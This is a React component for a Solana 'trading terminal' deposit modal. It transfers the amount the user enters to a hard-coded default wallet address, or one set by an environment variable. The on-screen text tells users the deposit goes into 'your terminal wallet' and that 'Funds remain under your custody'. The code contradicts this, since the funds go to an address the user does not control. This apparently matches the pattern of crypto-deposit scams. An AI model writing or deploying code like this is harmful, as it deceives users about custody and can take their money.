import { useCallback, useEffect, useMemo, useState } from 'react';
import { Connection, PublicKey, SystemProgram, Transaction } from '@solana/web3.js';
import styles from '@/styles/Home.module.css';

const DEFAULT_TERMINAL_ADDRESS = '7EudcA1K4PJQdMqTS14xM5a8x3Hrj5fZTu4J2RhxTp';

export default function DepositModal({ open, onClose, wallet, rpcEndpoint, onDepositComplete }) {
  const [amount, setAmount] = useState('');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(null);

  useEffect(() => {
    if (!open) {
      setAmount('');
      setLoading(false);
      setError(null);
    }
  }, [open]);

  const connection = useMemo(() => {
    if (!rpcEndpoint) return null;
    return new Connection(rpcEndpoint, 'confirmed');
  }, [rpcEndpoint]);

  const handleDeposit = useCallback(async () => {
    if (!window?.solana) {
      setError('Connect a wallet before depositing.');
      return;
    }
    if (!connection) {
      setError('Missing Solana RPC endpoint.');
      return;
    }
    if (!amount || Number.isNaN(Number(amount))) {
      setError('Enter a valid amount of SOL.');
      return;
    }
    if (!wallet) {
      setError('Wallet address missing. Reconnect and try again.');
      return;
    }
    try {
      setLoading(true);
      setError(null);
      const lamports = Math.floor(parseFloat(amount) * 1e9);
      const fromPubkey = new PublicKey(wallet);
      const toPubkey = new PublicKey(process.env.NEXT_PUBLIC_TERMINAL_WALLET ?? DEFAULT_TERMINAL_ADDRESS);
      const transaction = new Transaction().add(
        SystemProgram.transfer({ fromPubkey, toPubkey, lamports })
      );
      transaction.feePayer = fromPubkey;
      transaction.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
      const signed = await window.solana.signAndSendTransaction(transaction);
      await connection.confirmTransaction(signed.signature, 'confirmed');
      onDepositComplete(signed.signature);
    } catch (err) {
      setError(err.message ?? 'Failed to send transaction');
    } finally {
      setLoading(false);
    }
  }, [amount, connection, onDepositComplete, wallet]);

  if (!open) return null;

  return (
    <div className={styles.modalOverlay}>
      <div className={styles.modal}>
        <h2 className={styles.modalTitle}>Fund Trading Terminal</h2>
        <p className={styles.modalDescription}>
          Deposit SOL into your terminal wallet to unlock trading. Funds remain under your custody and are
          routed through the QuickNode RPC endpoint you configured.
        </p>
        <label className={styles.modalLabel} htmlFor="deposit-amount">
          Amount (SOL)
        </label>
        <input
          id="deposit-amount"
          className={styles.modalInput}
          type="number"
          min="0"
          step="0.01"
          placeholder="1.00"
          value={amount}
          onChange={(event) => setAmount(event.target.value)}
        />
        <p className={styles.modalHint}>
          Terminal wallet: {process.env.NEXT_PUBLIC_TERMINAL_WALLET ?? DEFAULT_TERMINAL_ADDRESS}
        </p>
        {error && <p className={styles.modalError}>{error}</p>}
        <div className={styles.modalActions}>
          <button type="button" className={styles.primaryButton} onClick={handleDeposit} disabled={loading}>
            {loading ? 'Processing…' : 'Confirm Deposit'}
          </button>
          <button type="button" className={styles.smallButton} onClick={onClose}>
            Cancel
          </button>
        </div>
      </div>
    </div>
  );
}
